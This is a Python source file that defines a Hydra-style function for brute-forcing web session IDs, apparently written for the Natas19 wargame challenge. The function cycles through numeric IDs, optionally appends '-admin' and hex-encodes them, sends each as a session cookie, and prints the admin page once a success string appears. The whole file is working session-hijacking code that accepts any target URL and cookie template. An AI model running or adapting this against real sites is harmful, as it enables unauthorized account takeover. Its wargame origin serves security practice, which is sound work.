from modules.utils import make_request


def brute_force_session(target_url, auth, id_range_str, cookie_template, success_string, hex_encode=False):
    """
    Brute-forces session IDs based on a specified range and template, inspired by Hydra.

    :param target_url: The target URL to attack.
    :param auth: The authentication tuple (user, pass).
    :param id_range_str: A string defining the range, e.g., "1:640:1" for start:stop:step.
    :param cookie_template: A template for the Cookie header, e.g., "PHPSESSID=^PASS^".
                            The '^PASS^' placeholder will be replaced with the generated ID.
    :param success_string: The text to search for in the response to confirm a successful login.
    :param hex_encode: If True, the generated ID will be hex-encoded before being used.
    """
    # --- 1. Parse the range string to get start, stop, and step values ---
    try:
        start, stop, step = map(int, id_range_str.split(':'))
        print(f"[+] Starting session brute-force from {start} to {stop} with step {step}.")
    except ValueError:
        print(f"[-] Invalid range string: '{id_range_str}'. It must be in 'start:stop:step' format.")
        return

    # --- 2. Validate and parse the cookie template ---
    if "^PASS^" not in cookie_template:
        print("[-] Invalid cookie template. It must contain the '^PASS^' placeholder.")
        return
    # Extract the cookie name (e.g., 'PHPSESSID') from the template.
    cookie_name, _ = cookie_template.split('=', 1)

    print(f"[+] Using cookie template: '{cookie_template}'")
    print(f"[+] Checking for success string: '{success_string}'")
    if hex_encode:
        print("[+] Hex-encoding is ENABLED.")

    # --- 3. Loop through the specified range and attack ---
    for i in range(start, stop + 1, step):
        # Generate the raw value for this attempt.
        raw_value = str(i)

        # Determine the final payload value (either raw or hex-encoded).
        if hex_encode:
            # For the specific challenge Natas19, the logic is to append "-admin" and then hex-encode the entire string.
            session_string_to_encode = f"{raw_value}-admin"
            final_value = session_string_to_encode.encode('utf-8').hex()
        else:
            final_value = raw_value

        # Create the cookie dictionary.
        cookies = {cookie_name: final_value}

        # Make the HTTP request with the generated cookie.
        response = make_request(target_url=target_url, auth=auth, method='GET', cookies=cookies)

        print(f"    testing ID {i}")

        # --- 4. Check for the success string in the response body ---
        if response and success_string in response.text:
            print(f"\n[!] SUCCESS: Found admin session with value: '{final_value}'")
            print(f"    └── Generated from ID: {i}")
            print("[+] Full response from admin page:")
            print(response.text)
            return final_value  # Exit after finding the first valid session.

    print(f"\n[-] Failed to find a valid session within the range {start}-{stop}.")
    return None
